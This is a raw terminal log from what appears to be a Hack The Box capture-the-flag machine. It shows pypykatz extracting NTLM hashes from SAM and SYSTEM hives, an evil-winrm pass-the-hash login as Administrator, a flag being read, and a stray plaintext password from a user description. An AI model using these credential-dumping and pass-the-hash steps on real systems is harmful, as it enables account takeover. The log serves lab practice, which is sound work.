-rw-r-----  1 angrybird angrybird         0 Aug 10 19:22  pavxn.gpr
-rw-rw-r--  1 angrybird angrybird        83 Aug 11 18:41  pwn.txt
-rw-rw-r--  1 angrybird angrybird      1156 Oct 19 13:57  req.py
-rw-rw-r--  1 angrybird angrybird       527 Oct 18 22:29  req1.py
-rw-rw-r--  1 angrybird angrybird       324 Oct 22 01:12  req111.py
-rw-rw-r--  1 angrybird angrybird 139921497 Dec  8  2021  rockyou.txt
-rw-rw-r--  1 angrybird angrybird     49152 Nov 15 22:59  sam
-rw-------  1 angrybird angrybird     33566 May 22 10:42  subdomains-top1million-5000.txt
-rw-rw-r--  1 angrybird angrybird  18518016 Nov 15 23:07  system
-rw-rw-r--  1 angrybird angrybird       198 Oct 22 00:49  unpickle_script.py
                                                                               
┌──(angrybird㉿kali)-[~/Desktop]
└─$ pypykatz regisstry --sam sam --system system
usage: pypykatz [-h] [-v]
                {live,lsa,registry,crypto,kerberos,dpapi,ldap,rdp,parser,smb,version,banner,logo}
                ...
pypykatz: error: argument command: invalid choice: 'regisstry' (choose from 'live', 'lsa', 'registry', 'crypto', 'kerberos', 'dpapi', 'ldap', 'rdp', 'parser', 'smb', 'version', 'banner', 'logo')
                                                                               
┌──(angrybird㉿kali)-[~/Desktop]
└─$ pypykatz registry --sam sam --system system 
usage: pypykatz [-h] [-v]
                {live,lsa,registry,crypto,kerberos,dpapi,ldap,rdp,parser,smb,version,banner,logo}
                ...
pypykatz: error: unrecognized arguments: --system


┌──(angrybird㉿kali)-[~/Desktop]
└─$ pypykatz registry --samfile sam --systemfile system

usage: pypykatz [-h] [-v]
                {live,lsa,registry,crypto,kerberos,dpapi,ldap,rdp,parser,smb,version,banner,logo}
                ...
pypykatz: error: unrecognized arguments: --samfile --systemfile system
                                                                               
┌──(angrybird㉿kali)-[~/Desktop]
└─$ pypykatz registry --sam sam system             

WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work
WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work
============== SYSTEM hive secrets ==============
CurrentControlSet: ControlSet001
Boot Key: 3c2b033757a49110a9ee680b46e8d620
============== SAM hive secrets ==============
HBoot Key: a1c299e572ff8c643a857d3fdb3e5c7c10101010101010101010101010101010
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

                                                






                                                                             
┌──(angrybird㉿kali)-[~/Desktop/Openvpn]
└─$ evil-winrm -i cicada.htb -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls


    Directory: C:\Users\Administrator\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/14/2024  10:20 PM                WindowsPowerShell


cd*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> ls


    Directory: C:\Users\Administrator


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---         3/14/2024   3:45 AM                3D Objects
d-r---         3/14/2024   3:45 AM                Contacts
d-r---         8/30/2024  10:06 AM                Desktop
d-r---         3/14/2024  10:20 PM                Documents
d-r---         3/14/2024   3:45 AM                Downloads
d-r---         3/14/2024   3:45 AM                Favorites
d-r---         3/14/2024   3:45 AM                Links
d-r---         3/14/2024   3:45 AM                Music
d-r---         3/14/2024   3:45 AM                Pictures
d-r---         3/14/2024   3:45 AM                Saved Games
d-r---         3/14/2024   3:45 AM                Searches
d-r---         3/14/2024   3:45 AM                Videos


cd *Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        11/15/2024   3:01 PM             34 root.txt


cat*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
bbf16dbc762b08c162466a672fdc12cb
*Evil-WinRM* PS C:\Users\Administrator\Desktop> enum4lin
                                        
Warning: Press "y" to exit, press any other key to continue








https://www.youtube.com/watch?v=oPd6bckIUeI




david.orelious	Name: (null)	Desc: Just in case I forget my password is aRt$Lp#7t*VQ!3




https://www.hyhforever.top/hackthebox-compiled/


```
